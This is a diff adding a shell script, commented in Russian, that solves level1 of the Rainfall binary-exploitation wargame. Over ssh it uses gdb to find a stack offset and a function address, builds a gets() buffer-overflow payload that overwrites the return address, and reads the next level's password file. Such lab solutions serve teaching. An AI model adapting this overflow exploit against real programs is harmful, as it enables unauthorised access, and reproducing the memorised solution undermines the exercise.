@@ -1,0 +1,23 @@
+# 1. Запустить программу в дебаггере
+# 2. Найти функции main и run
+# 3. Узнать, что оболочка следующего юзера запускается в функции run, которая никогда не выполняется
+# 4. Найти в main небезопасную функцию gets
+# 5. Посчитать сдвиг от начала стека
+# 6. Записать строку размера сдвига и добавить к ней адрес функции run
+# 7. Запустить программу с этой строкой и получить пароль
+
+ssh level1@$RAINFALL_IP -p 4242 '
+    # определение размера стека
+    STACK_OFFSET=$(
+        gdb --batch -ex "disas main" -ex "break gets" -ex "run" -ex "p/d \$ebp + 4 - \$eax" ./level1 \
+        | grep \$1 | awk "{print \$3}"
+    )
+    # определение адреса функции run
+    RUN_FUNC_ADDR=$(gdb --batch -ex "info function" ./level1 | grep run | awk "{print \$1}")
+    # little endian
+    RUN_FUNC_ADDR="\x${RUN_FUNC_ADDR:8:2}\x${RUN_FUNC_ADDR:6:2}\x${RUN_FUNC_ADDR:4:2}\x${RUN_FUNC_ADDR:2:2}"
+    # сохранение строки с переписанным адресом возврата
+    python -c "print \"x\" * $STACK_OFFSET + \"$RUN_FUNC_ADDR\"" > /tmp/level1
+    # запуск программы с переполнением
+    (cat /tmp/level1 - | ./level1) <<< "cat /home/user/level2/.pass"
+'
